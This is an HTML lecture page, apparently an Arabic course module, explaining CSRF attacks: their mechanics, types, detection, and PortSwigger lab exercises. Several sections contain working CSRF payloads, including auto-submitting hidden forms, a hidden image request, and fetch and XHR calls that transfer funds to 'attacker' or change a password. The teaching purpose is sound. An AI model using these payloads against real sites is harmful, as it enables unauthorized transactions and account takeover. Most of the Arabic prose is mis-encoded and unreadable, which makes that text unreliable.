<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ูุญุงุถุฑุฉ Cross-Site Request Forgery (CSRF)</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-okaidia.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; line-height: 1.6; color: #e8eaed; background: #151b2f; min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 48px; padding: 64px 24px; background: linear-gradient(135deg, #1a2125, #203942); border-radius: 12px; box-shadow: 0 4px 24px rgb(33, 48, 70); }
        .header h1 { font-size: 2.5rem; font-weight: 400; color: #e8eaed; margin-bottom: 16px; letter-spacing: -0.5px; }
        .header .subtitle { font-size: 1.1rem; font-weight: 300; color: rgba(255, 255, 255, 0.9); margin-bottom: 24px; }
        .lecture-info { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; margin-top: 20px; }
        .info-item { background: rgba(165, 180, 252, 0.2); padding: 12px 24px; border-radius: 24px; border: 1px solid rgba(165, 180, 252, 0.3); color: #a5b4fc; font-weight: 500; }
        .info-item i { color: #a5b4fc; margin-left: 8px; }
        .nav-menu { background: #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 32px; border: 1px solid #2d3748; box-shadow: 0 1px 6px rgba(26, 35, 50, 0.4); }
        .nav-menu h3 { color: #e8eaed; font-size: 1.5rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
        .nav-menu ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
        .nav-menu a { display: flex; align-items: center; padding: 12px 16px; color: #e8eaed; text-decoration: none; border-radius: 8px; transition: all 0.2s ease; border: 1px solid transparent; }
        .nav-menu a:hover { background: #2d3748; border-color: #3b475d; }
        section { background: #0f1724; border: 1px solid #2b3447; border-radius: 12px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(33, 48, 70, 0.3); }
        h2 { color: #e8eaed; font-size: 1.6rem; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }
        h3 { color: #a5b4fc; font-size: 1.2rem; margin: 14px 0; }
        h4 { color: #c7d2fe; font-size: 1.1rem; margin: 12px 0 8px 0; font-weight: 500; }
        p { color: #c7d2fe; margin-bottom: 12px; line-height: 1.7; }
        .list { margin: 10px 0 0 0; padding-right: 18px; color: #c7d2fe; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin: 20px 0; }
        .card { background: #0c1220; border: 1px solid #263148; border-radius: 10px; padding: 18px; }
        .code-block { 
            background: #0d1117; 
            border: 1px solid #30363d; 
            border-radius: 6px; 
            padding: 16px; 
            color: #f0f6fc; 
            font-family: 'SFMono-Regular', 'Consolas', 'Liberation Mono', 'Menlo', monospace; 
            overflow-x: auto; 
            margin: 16px 0; 
            font-size: 14px; 
            line-height: 1.45;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
            white-space: pre-wrap;
        }
        .tip { background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); color: #d1fae5; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .warn { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); color: #fde68a; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .danger { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.25); color: #fecaca; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .attack-demo { background: #1a1a2e; border: 1px solid #16213e; border-radius: 10px; padding: 20px; margin: 16px 0; }
        .attack-demo h4 { color: #ff6b6b; margin-bottom: 12px; }
        .lab-card { background: linear-gradient(135deg, #1e3a8a, #1e40af); border: 1px solid #3b82f6; border-radius: 12px; padding: 20px; margin: 12px 0; }
        .lab-card h4 { color: #e8eaed; margin-bottom: 8px; }
        .lab-card p { color: #dbeafe; font-size: 0.95rem; }
        .lab-link { display: inline-block; background: #3b82f6; color: #e8eaed; padding: 8px 16px; border-radius: 6px; text-decoration: none; margin-top: 10px; font-size: 0.9rem; }
        .lab-link:hover { background: #2563eb; }
        .comparison-table { width: 100%; border-collapse: collapse; margin: 20px 0; background: #0c1220; border-radius: 8px; overflow: hidden; }
        .comparison-table th, .comparison-table td { padding: 12px; text-align: right; border-bottom: 1px solid #263148; }
        .comparison-table th { background: #1e3a8a; color: #e8eaed; font-weight: 500; }
        .comparison-table tr:hover { background: #1a2332; }
        .mermaid { 
            background: #1a2332 !important; 
            border: 1px solid #2d3748; 
            border-radius: 8px; 
            padding: 16px; 
            margin: 16px 0; 
            color: #e8eaed !important;
        }
        .mermaid svg { background: #1a2332 !important; }
        .mermaid .node rect, .mermaid .node circle, .mermaid .node ellipse, .mermaid .node polygon {
            fill: #1a2332 !important; stroke: #2d3748 !important; color: #e8eaed !important;
        }
        .mermaid .edgeLabel { background-color: #1a2332 !important; color: #e8eaed !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-shield-alt"></i> Cross-Site Request Forgery (CSRF)</h1>
            <div class="subtitle">ุงุณุชุบูุงู ุซุบุฑุงุช ุงูุชุฒููุฑ ุนุจุฑ ุงูููุงูุน</div>
            <div class="lecture-info">
                <div class="info-item"><i class="fas fa-clock"></i> 2 ุณุงุนุฉ</div>
                <div class="info-item"><i class="fas fa-flask"></i> 8 ูุฎุชุจุฑุงุช</div>
                <div class="info-item"><i class="fas fa-signal"></i> ูุชูุณุท ุฅูู ูุชูุฏู</div>
                <div class="info-item"><i class="fas fa-shield-alt"></i> ุญูุงูุฉ ุดุงููุฉ</div>
            </div>
        </div>

        <div class="nav-menu">
            <h3>ูุญุชููุงุช ุงููุญุงุถุฑุฉ</h3>
            <ul>
                <li><a href="#intro"><i class="fas fa-info-circle"></i> ููุฏูุฉ</a></li>
                <li><a href="#csrf-overview"><i class="fas fa-shield-alt"></i> ูุธุฑุฉ ุนุงูุฉ ุนูู CSRF</a></li>
                <li><a href="#csrf-types"><i class="fas fa-bug"></i> ุฃููุงุน CSRF</a></li>
                <li><a href="#comparison"><i class="fas fa-balance-scale"></i> ููุงุฑูุฉ ุดุงููุฉ</a></li>
                <li><a href="#detection"><i class="fas fa-search"></i> ุทุฑู ุงูุงูุชุดุงู</a></li>
                <li><a href="#exploitation"><i class="fas fa-crosshairs"></i> ุทุฑู ุงูุงุณุชุบูุงู</a></li>
                <li><a href="#labs"><i class="fas fa-flask"></i> ูุฎุชุจุฑุงุช ุนูููุฉ</a></li>
                <li><a href="#defense"><i class="fas fa-shield-halved"></i> ุทุฑู ุงูุญูุงูุฉ</a></li>
                <li><a href="#summary"><i class="fas fa-list-check"></i> ุงูุฎูุงุตุฉ</a></li>
            </ul>
        </div>

        <section id="intro">
            <h2><i class="fas fa-info-circle"></i> ููุฏูุฉ - ูุง ูู CSRFุ</h2>
            
            <p>ูุฑุญุจุงู ุจูู ูู ูุญุงุถุฑุฉ Cross-Site Request Forgery (CSRF)! ๐ฏ</p>
            
            <p>ุซุบุฑุฉ <strong>CSRF</strong> ูู ูุฌูู ูุญุฏุซ ุนูุฏูุง ูููู ูููุน ููุจ ุถุงุฑ ุจุฅุฌุจุงุฑ ูุชุตูุญ ุงููุณุชุฎุฏู ุนูู ุชูููุฐ ุทูุจ ุบูุฑ ูุฑุบูุจ ููู ุฅูู ูููุน ุขุฎุฑ ูููู ุงููุณุชุฎุฏู ูุตุงุฏูุงู ุนููู ุจุงููุนู. ูุฐุง ุงููุฌูู ุฎุทูุฑ ูุฃูู ูููู ุฃู ูุคุฏู ุฅูู ุชุบููุฑ ูููุงุช ุงููุฑูุฑุ ุชุญููู ุงูุฃููุงูุ ุฃู ุชูููุฐ ุฃู ุฅุฌุฑุงุก ุขุฎุฑ ููุงุจุฉ ุนู ุงููุณุชุฎุฏู.</p>

            <div class="tip">
                <h4><i class="fas fa-lightbulb"></i> ูุง ุณุชุชุนููู ูู ูุฐู ุงููุญุงุถุฑุฉ</h4>
                <ul class="list">
                    <li>๐ฏ ููู ุขููุฉ ุนูู ูุฌูุงุช CSRF</li>
                    <li>๐ต๏ธ 5 ุฃููุงุน ูุฎุชููุฉ ูู ูุฌูุงุช CSRF</li>
                    <li>โ๏ธ ููุงุฑูุฉ ุดุงููุฉ ุจูู ุฌููุน ุงูุฃููุงุน</li>
                    <li>๐ ุทุฑู ุงูุชุดุงู ูุงุณุชุบูุงู ูู ููุน</li>
                    <li>๐งช 8 ูุฎุชุจุฑุงุช ุนูููุฉ ูุชุฏุฑุฌุฉ ุงูุตุนูุจุฉ</li>
                    <li>๐ก๏ธ ุงุณุชุฑุงุชูุฌูุงุช ุงูุญูุงูุฉ ูุงูุฏูุงุน</li>
                    <li>๐ง ุฃุฏูุงุช ุงูุงุฎุชุจุงุฑ ุงููุชูุฏูุฉ</li>
                </ul>
            </div>

            <div class="danger">
                <h4><i class="fas fa-exclamation-triangle"></i> ููุงุฐุง ูุฌูุงุช CSRF ุฎุทูุฑุฉุ</h4>
                <ul class="list">
                    <li><strong>ุชูููุฐ ุฅุฌุฑุงุกุงุช ุบูุฑ ูุฑุบูุจุฉ:</strong> ุชุบููุฑ ูููุงุช ุงููุฑูุฑุ ุชุญููู ุงูุฃููุงูุ ุญุฐู ุงูุจูุงูุงุช</li>
                    <li><strong>ุตุนูุจุฉ ุงูุงูุชุดุงู:</strong> ูุฏ ูุง ููุงุญุธ ุงููุณุชุฎุฏู ุฃู ูุฌููุงู ูุฏ ุญุฏุซ</li>
                    <li><strong>ุงูุชุดุงุฑ ูุงุณุน:</strong> ุชุคุซุฑ ุนูู ุฌููุน ุงูุชุทุจููุงุช ุงูุชู ูุง ุชุณุชุฎุฏู ุญูุงูุฉ CSRF</li>
                    <li><strong>ุชุฃุซูุฑ ูุจุงุดุฑ:</strong> ุชุคุซุฑ ุนูู ุญุณุงุจุงุช ุงููุณุชุฎุฏููู ุงููุตุงุฏููู</li>
                </ul>
            </div>
        </section>

        <section id="csrf-overview">
            <h2><i class="fas fa-shield-alt"></i> ูุธุฑุฉ ุนุงูุฉ ุนูู CSRF</h2>
            
            <p>ูุฌูู CSRF ูุนุชูุฏ ุนูู ุญูููุฉ ุฃู ุงููุชุตูุญ ูุฑุณู ุชููุงุฆูุงู ูููุงุช ุชุนุฑูู ุงูุงุฑุชุจุงุท (cookies) ูุน ูู ุทูุจ ุฅูู ููุณ ุงููุทุงู. ุฅุฐุง ูุงู ุงููุณุชุฎุฏู ูุตุงุฏูุงู ุนูู ูููุน ูุนููุ ูุฅู ุฃู ุทูุจ ูู ูููุน ุขุฎุฑ ุณูุญูู ูุนู ุจูุงูุงุช ุงููุตุงุฏูุฉ.</p>

            <div class="mermaid">
sequenceDiagram
    participant A as ๐ฅท ุงูููุงุฌู
    participant V as ๐ค ุงูุถุญูุฉ
    participant B as ๐ ูุชุตูุญ ุงูุถุญูุฉ
    participant T as ๐ฏ ุงููููุน ุงููุณุชูุฏู
    
    A->>A: 1. ููุดุฆ ุตูุญุฉ ููุจ ุถุงุฑุฉ
    Note over A: ุชุญุชูู ุนูู ูููุฐุฌ ุฃู ุฑุงุจุท ุฎุจูุซ
    A->>V: 2. ูุฑุณู ุงูุฑุงุจุท ููุถุญูุฉ
    V->>B: 3. ุงูุถุญูุฉ ูุฒูุฑ ุงูุฑุงุจุท
    B->>T: 4. ุงููุชุตูุญ ูุฑุณู ุทูุจ ูุน cookies ุงููุตุงุฏูุฉ
    T->>T: 5. ูุนุงูุฌ ุงูุทูุจ ูุฃูู ูู ุงููุณุชุฎุฏู ๐ฅ
    T-->>B: 6. ูุณุชุฌูุจ ููุทูุจ
    B-->>V: 7. ุงูุถุญูุฉ ูุง ููุงุญุธ ูุง ุญุฏุซ
                </div>

            <div class="code-block">
<span class="code-header"><i class="fas fa-code"></i> ูุซุงู: ูุฌูู CSRF ุจุณูุท</span>
<pre><code>&lt;!-- ุตูุญุฉ ููุจ ุถุงุฑุฉ --&gt;
&lt;html&gt;
&lt;body&gt;
    &lt;form action="https://bank.com/transfer" method="POST"&gt;
        &lt;input type="hidden" name="amount" value="1000"&gt;
        &lt;input type="hidden" name="to" value="attacker_account"&gt;
        &lt;input type="submit" value="ุงุญุตู ุนูู ุฌุงุฆุฒุฉ!"&gt;
    &lt;/form&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
            </div>

            <div class="warn">
                <h4>โ๏ธ ูุชุทูุจุงุช ูุฌุงุญ ูุฌูู CSRF</h4>
                <p>ููู ููุฌุญ ูุฌูู CSRFุ ูุฌุจ ุชููุฑ ุงูุดุฑูุท ุงูุชุงููุฉ:</p>
                <ul class="list">
                    <li><strong>ุงููุตุงุฏูุฉ:</strong> ูุฌุจ ุฃู ูููู ุงููุณุชุฎุฏู ูุตุงุฏูุงู ุนูู ุงููููุน ุงููุณุชูุฏู</li>
                    <li><strong>ุนุฏู ูุฌูุฏ ุญูุงูุฉ:</strong> ุงููููุน ูุง ูุณุชุฎุฏู CSRF tokens ุฃู ุญูุงูุฉ ุฃุฎุฑู</li>
                    <li><strong>ุฅุฌุฑุงุก ูุงุจู ููุชูููุฐ:</strong> ูุฌูุฏ ูุธููุฉ ูููู ุงุณุชุบูุงููุง</li>
                    <li><strong>ุชูุจุค ุจุงูุทูุจ:</strong> ูุนุฑูุฉ ุดูู ุงูุทูุจ ุงููุทููุจ</li>
                </ul>
            </div>
        </section>

        <section id="csrf-types">
            <h2><i class="fas fa-bug"></i> ุฃููุงุน ูุฌูุงุช CSRF</h2>
            
            <div class="grid">
                <div class="card">
                    <h3>๐ฏ 1. GET-based CSRF</h3>
                    <p><strong>ุงูุชุนุฑูู:</strong> ูุฌูู CSRF ูุณุชุฎุฏู ุทูุจุงุช GET.</p>
                    <p><strong>ุงููุตุฏุฑ:</strong> ุฑูุงุจุทุ ุตูุฑุ iframes</p>
                    <p><strong>ุงูุชุฃุซูุฑ:</strong> ุชูููุฐ ุฅุฌุฑุงุกุงุช ุจุณูุทุฉ</p>
                    <div class="code-block">
<span class="code-header"><i class="fas fa-code"></i> ูุซุงู</span>
<pre><code>&lt;!-- ูุฌูู GET-based CSRF --&gt;
&lt;img src="https://bank.com/transfer?amount=1000&to=attacker" 
     style="display:none"&gt;

&lt;!-- ุฃู ุจุงุณุชุฎุฏุงู iframe --&gt;
&lt;iframe src="https://bank.com/delete-account"&gt;&lt;/iframe&gt;</code></pre>
                    </div>
                </div>

                <div class="card">
                    <h3>๐ 2. POST-based CSRF</h3>
                    <p><strong>ุงูุชุนุฑูู:</strong> ูุฌูู CSRF ูุณุชุฎุฏู ุทูุจุงุช POST.</p>
                    <p><strong>ุงููุตุฏุฑ:</strong> ููุงุฐุฌ HTMLุ JavaScript</p>
                    <p><strong>ุงูุชุฃุซูุฑ:</strong> ุชูููุฐ ุฅุฌุฑุงุกุงุช ูุนูุฏุฉ</p>
                    <div class="code-block">
<span class="code-header"><i class="fas fa-code"></i> ูุซุงู</span>
<pre><code>&lt;!-- ูุฌูู POST-based CSRF --&gt;
&lt;form action="https://bank.com/transfer" method="POST"&gt;
    &lt;input type="hidden" name="amount" value="1000"&gt;
    &lt;input type="hidden" name="to" value="attacker"&gt;
    &lt;input type="hidden" name="description" value="ูุฏูุฉ"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
                    </div>
                </div>

                <div class="card">
                    <h3>๐ 3. JSON-based CSRF</h3>
                    <p><strong>ุงูุชุนุฑูู:</strong> ูุฌูู CSRF ูุณุชุฎุฏู ุทูุจุงุช JSON.</p>
                    <p><strong>ุงููุตุฏุฑ:</strong> APIsุ AJAX requests</p>
                    <p><strong>ุงูุชุฃุซูุฑ:</strong> ุงุณุชุบูุงู APIs</p>
                    <div class="code-block">
<span class="code-header"><i class="fas fa-code"></i> ูุซุงู</span>
<pre><code>&lt;!-- ูุฌูู JSON-based CSRF --&gt;
&lt;script&gt;
fetch('https://api.bank.com/transfer', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        amount: 1000,
        to: 'attacker'
    })
});
&lt;/script&gt;</code></pre>
                    </div>
                </div>

                <div class="card">
                    <h3>๐ 4. Multi-step CSRF</h3>
                    <p><strong>ุงูุชุนุฑูู:</strong> ูุฌูู CSRF ูุชุทูุจ ุฎุทูุงุช ูุชุนุฏุฏุฉ.</p>
                    <p><strong>ุงููุตุฏุฑ:</strong> ุนูููุงุช ูุนูุฏุฉ</p>
                    <p><strong>ุงูุชุฃุซูุฑ:</strong> ุชูููุฐ ุนูููุงุช ูุชูุฏูุฉ</p>
                    <div class="code-block">
<span class="code-header"><i class="fas fa-code"></i> ูุซุงู</span>
<pre><code>&lt;!-- ูุฌูู Multi-step CSRF --&gt;
&lt;script&gt;
// ุงูุฎุทูุฉ ุงูุฃููู: ุชุบููุฑ ูููุฉ ุงููุฑูุฑ
fetch('/change-password', {
    method: 'POST',
    body: 'new_password=attacker123'
});

// ุงูุฎุทูุฉ ุงูุซุงููุฉ: ุชุญููู ุงูุฃููุงู
setTimeout(() => {
    fetch('/transfer', {
        method: 'POST',
        body: 'amount=1000&to=attacker'
    });
}, 1000);
&lt;/script&gt;</code></pre>
                    </div>
                </div>

                <div class="card">
                    <h3>๐๏ธ 5. Blind CSRF</h3>
                    <p><strong>ุงูุชุนุฑูู:</strong> ูุฌูู CSRF ุจุฏูู ุงุณุชุฌุงุจุฉ ูุฑุฆูุฉ.</p>
                    <p><strong>ุงููุตุฏุฑ:</strong> ุทูุจุงุช ุฎูููุฉ</p>
                    <p><strong>ุงูุชุฃุซูุฑ:</strong> ุชูููุฐ ุฅุฌุฑุงุกุงุช ุฎููุฉ</p>
                    <div class="code-block">
<span class="code-header"><i class="fas fa-code"></i> ูุซุงู</span>
<pre><code>&lt;!-- ูุฌูู Blind CSRF --&gt;
&lt;script&gt;
// ุฅุฑุณุงู ุทูุจ ุจุฏูู ุงูุชุธุงุฑ ุงุณุชุฌุงุจุฉ
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bank.com/transfer', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('amount=1000&to=attacker');
&lt;/script&gt;</code></pre>
                    </div>
                </div>
            </div>
        </section>

        <section id="comparison">
            <h2><i class="fas fa-balance-scale"></i> ููุงุฑูุฉ ุดุงููุฉ ุจูู ุฃููุงุน CSRF</h2>
            
            <p>ูุฐุง ุงูุฌุฏูู ูุณุงุนุฏู ุนูู ููู ุงููุฑูู ุงูุฑุฆูุณูุฉ ุจูู ุฃููุงุน ูุฌูุงุช CSRF ูููููุฉ ุชูููุฒูุง:</p>

            <table class="comparison-table">
                <thead>
                    <tr>
                        <th>ููุน ุงููุฌูู</th>
                        <th>ุงูุชุนููุฏ</th>
                        <th>ุงูุงูุชุดุงู</th>
                        <th>ุงูุจูุงูุงุช</th>
                        <th>ุงูุงุณุชุฎุฏุงู</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td><strong>GET-based</strong></td>
                        <td>ููุฎูุถ</td>
                        <td>ุณูู</td>
                        <td>ูุญุฏูุฏุฉ</td>
                        <td>ุจุณูุทุฉ</td>
                    </tr>
                    <tr>
                        <td><strong>POST-based</strong></td>
                        <td>ูุชูุณุท</td>
                        <td>ูุชูุณุท</td>
                        <td>ุบูุฑ ูุญุฏูุฏุฉ</td>
                        <td>ุดุงุฆุนุฉ</td>
                    </tr>
                    <tr>
                        <td><strong>JSON-based</strong></td>
                        <td>ูุชูุณุท</td>
                        <td>ุตุนุจ</td>
                        <td>ูุนูุฏุฉ</td>
                        <td>APIs</td>
                    </tr>
                    <tr>
                        <td><strong>Multi-step</strong></td>
                        <td>ุนุงูู</td>
                        <td>ุตุนุจ ุฌุฏุงู</td>
                        <td>ูุชุนุฏุฏุฉ</td>
                        <td>ูุชูุฏูุฉ</td>
                    </tr>
                    <tr>
                        <td><strong>Blind</strong></td>
                        <td>ูุชูุณุท</td>
                        <td>ุตุนุจ</td>
                        <td>ูุญุฏูุฏุฉ</td>
                        <td>ุชุฎุฑูุจูุฉ</td>
                    </tr>
                </tbody>
            </table>

            <div class="tip">
                <h4>๐ก ููููุฉ ุงูุชูููุฒ ุจูู ุฃููุงุน ุงููุฌูุงุช</h4>
                <ul class="list">
                    <li><strong>GET-based:</strong> ุงุจุญุซ ุนู ุฑูุงุจุท ุฃู ุตูุฑ ุชููุฐ ุฅุฌุฑุงุกุงุช</li>
                    <li><strong>POST-based:</strong> ุงุจุญุซ ุนู ููุงุฐุฌ HTML ูุฎููุฉ</li>
                    <li><strong>JSON-based:</strong> ุงุจุญุซ ุนู ุทูุจุงุช fetch ุฃู XMLHttpRequest</li>
                    <li><strong>Multi-step:</strong> ุงุจุญุซ ุนู ุชุณูุณู ูู ุงูุทูุจุงุช</li>
                    <li><strong>Blind:</strong> ุงุจุญุซ ุนู ุทูุจุงุช ุจุฏูู ูุนุงูุฌุฉ ุงูุงุณุชุฌุงุจุฉ</li>
                </ul>
            </div>
        </section>

        <section id="detection">
            <h2><i class="fas fa-search"></i> ุทุฑู ุงูุชุดุงู ุซุบุฑุงุช CSRF</h2>
            
            <div class="grid">
                <div class="card">
                    <h3>๐ 1. ุงููุญุต ุงููุฏูู</h3>
                    <ul class="list">
                        <li>ูุญุต ุงูููุงุฐุฌ ูุงูุฑูุงุจุท</li>
                        <li>ุงูุจุญุซ ุนู ุนุฏู ูุฌูุฏ CSRF tokens</li>
                        <li>ุงุฎุชุจุงุฑ ุฅุฌุฑุงุกุงุช ุญุณุงุณุฉ</li>
                        <li>ูุฑุงูุจุฉ ุงูุทูุจุงุช ูุงูุฑุฏูุฏ</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>๐๏ธ 2. ุฃุฏูุงุช ุงูุงุฎุชุจุงุฑ</h3>
                    <ul class="list">
                        <li><strong>Burp Suite:</strong> ุชุญููู ุงูุทูุจุงุช ูุงูุฑุฏูุฏ</li>
                        <li><strong>OWASP ZAP:</strong> ูุญุต ุชููุงุฆู ููุซุบุฑุงุช</li>
                        <li><strong>Browser DevTools:</strong> ูุญุต ุงูุทูุจุงุช</li>
                        <li><strong>CSRF PoC Generator:</strong> ุฅูุดุงุก ุฃุฏูุฉ ุนูู ุงูููููู</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>๐ 3. ูุคุดุฑุงุช ุงูุซุบุฑุงุช</h3>
                    <ul class="list">
                        <li>ุนุฏู ูุฌูุฏ CSRF tokens</li>
                        <li>ุนุฏู ุงูุชุญูู ูู Referer header</li>
                        <li>ุนุฏู ุงุณุชุฎุฏุงู SameSite cookies</li>
                        <li>ุฅุฌุฑุงุกุงุช ุญุณุงุณุฉ ุจุฏูู ุชุฃููุฏ</li>
                    </ul>
                </div>
            </div>

            <div class="code-block">
<span class="code-header"><i class="fas fa-code"></i> ูุซุงู: ูุญุต CSRF</span>
<pre><code>// ุงุฎุชุจุงุฑ
// GET-based CSRF
&lt;img src="https://target.com/action?param=value" style="display:none"&gt;

// POST-based CSRF
&lt;form action="https://target.com/action" method="POST"&gt;
    &lt;input type="hidden" name="param" value="value"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
            </div>
        </section>

        <section id="exploitation">
            <h2><i class="fas fa-crosshairs"></i> ุทุฑู ุงุณุชุบูุงู ุซุบุฑุงุช CSRF</h2>
            
            <div class="attack-demo">
                <h4>๐ฏ ุงุณุชุบูุงู GET-based CSRF</h4>
                <div class="mermaid">
sequenceDiagram
    participant A as ๐ฅท ุงูููุงุฌู
    participant V as ๐ค ุงูุถุญูุฉ
    participant B as ๐ ูุชุตูุญ ุงูุถุญูุฉ
    participant T as ๐ฏ ุงููููุน ุงููุณุชูุฏู
    
    A->>A: 1. ููุดุฆ ุตูุญุฉ ููุจ ุถุงุฑุฉ
    Note over A: ุชุญุชูู ุนูู ุฑุงุจุท ุฃู ุตูุฑุฉ ุฎุจูุซุฉ
    A->>V: 2. ูุฑุณู ุงูุฑุงุจุท ููุถุญูุฉ
    V->>B: 3. ุงูุถุญูุฉ ูุฒูุฑ ุงูุฑุงุจุท
    B->>T: 4. ุงููุชุตูุญ ูุฑุณู ุทูุจ GET ูุน cookies
    T->>T: 5. ูุนุงูุฌ ุงูุทูุจ ูุฃูู ูู ุงููุณุชุฎุฏู ๐ฅ
    T-->>B: 6. ูุณุชุฌูุจ ููุทูุจ
                </div>
            </div>

            <div class="attack-demo">
                <h4>๐ ุงุณุชุบูุงู POST-based CSRF</h4>
                <div class="mermaid">
sequenceDiagram
    participant A as ๐ฅท ุงูููุงุฌู
    participant V as ๐ค ุงูุถุญูุฉ
    participant B as ๐ ูุชุตูุญ ุงูุถุญูุฉ
    participant T as ๐ฏ ุงููููุน ุงููุณุชูุฏู
    
    A->>A: 1. ููุดุฆ ุตูุญุฉ ููุจ ุถุงุฑุฉ
    Note over A: ุชุญุชูู ุนูู ูููุฐุฌ HTML ูุฎูู
    A->>V: 2. ูุฑุณู ุงูุฑุงุจุท ููุถุญูุฉ
    V->>B: 3. ุงูุถุญูุฉ ูุฒูุฑ ุงูุฑุงุจุท
    B->>B: 4. JavaScript ูุฑุณู ุงููููุฐุฌ ุชููุงุฆูุงู
    B->>T: 5. ุงููุชุตูุญ ูุฑุณู ุทูุจ POST ูุน cookies
    T->>T: 6. ูุนุงูุฌ ุงูุทูุจ ูุฃูู ูู ุงููุณุชุฎุฏู ๐ฅ
                </div>
            </div>

            <div class="warn">
                <h4>โ๏ธ ูุตุงุฆุญ ูููุฉ ููุงุณุชุบูุงู</h4>
                <ul class="list">
                    <li><strong>ุงููู ุงูุทูุจ:</strong> ูุง ูู ุงููุนุงููุงุช ุงููุทููุจุฉุ</li>
                    <li><strong>ุงุฎุชุจุฑ ุชุฏุฑูุฌูุงู:</strong> ุงุจุฏุฃ ุจุงุฎุชุจุงุฑุงุช ุจุณูุทุฉ ุซู ุชุทูุฑ</li>
                    <li><strong>ุงุณุชุฎุฏู Burp Suite:</strong> ูุชุญููู ุงูุทูุจุงุช ูุงูุฑุฏูุฏ</li>
                    <li><strong>ุงุฎุชุจุฑ ูู ุจูุฆุฉ ุขููุฉ:</strong> ูุง ุชุฎุชุจุฑ ุนูู ููุงูุน ุญููููุฉ</li>
                </ul>
            </div>
        </section>

        <section id="labs">
            <h2><i class="fas fa-flask"></i> ูุฎุชุจุฑุงุช ุนูููุฉ (8) - PortSwigger Academy</h2>
            <p>ูุฎุชุจุฑุงุช ูุชุฏุฑุฌุฉ ุงูุตุนูุจุฉ ููู ููุน ูู ุฃููุงุน ูุฌูุงุช CSRF:</p>

            <h3>๐ฏ ูุฎุชุจุฑุงุช GET-based CSRF</h3>
            <div class="lab-card">
                <h4>๐งช Lab 1: CSRF vulnerability with no defenses</h4>
                <p><strong>ุงููุฏู:</strong> ุงุณุชุบูุงู CSRF ุจุณูุท ุจุฏูู ุญูุงูุฉ</p>
                <p><strong>ุงูุชูููุฉ:</strong> ุฅูุดุงุก ูููุฐุฌ HTML ุฎุจูุซ</p>
                <a href="https://portswigger.net/web-security/csrf/lab-no-defenses" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> ูุชุญ ุงููุฎุชุจุฑ
                </a>
            </div>

            <h3>๐ ูุฎุชุจุฑุงุช POST-based CSRF</h3>
            <div class="lab-card">
                <h4>๐งช Lab 2: CSRF where token validation depends on request method</h4>
                <p><strong>ุงููุฏู:</strong> ุงุณุชุบูุงู CSRF ูุน ุญูุงูุฉ ุถุนููุฉ</p>
                <p><strong>ุงูุชูููุฉ:</strong> ุชุบููุฑ ุทุฑููุฉ ุงูุทูุจ</p>
                <a href="https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> ูุชุญ ุงููุฎุชุจุฑ
                </a>
            </div>

            <h3>๐ ูุฎุชุจุฑุงุช JSON-based CSRF</h3>
            <div class="lab-card">
                <h4>๐งช Lab 3: CSRF where token validation depends on token being present</h4>
                <p><strong>ุงููุฏู:</strong> ุงุณุชุบูุงู CSRF ูุน ุญูุงูุฉ JSON</p>
                <p><strong>ุงูุชูููุฉ:</strong> ุชุฎุทู ุงูุชุญูู ูู ุงูู token</p>
                <a href="https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> ูุชุญ ุงููุฎุชุจุฑ
                </a>
            </div>

            <h3>๐ ูุฎุชุจุฑุงุช Multi-step CSRF</h3>
            <div class="lab-card">
                <h4>๐งช Lab 4: CSRF where token is not tied to user session</h4>
                <p><strong>ุงููุฏู:</strong> ุงุณุชุบูุงู CSRF ูุชุนุฏุฏ ุงูุฎุทูุงุช</p>
                <p><strong>ุงูุชูููุฉ:</strong> ุงุณุชุฎุฏุงู token ูู ุฌูุณุฉ ุฃุฎุฑู</p>
                <a href="https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session" class="lab-link" target="_blank">
                    <i class="fas fa-external-link-alt"></i> ูุชุญ ุงููุฎุชุจุฑ
                </a>
            </div>

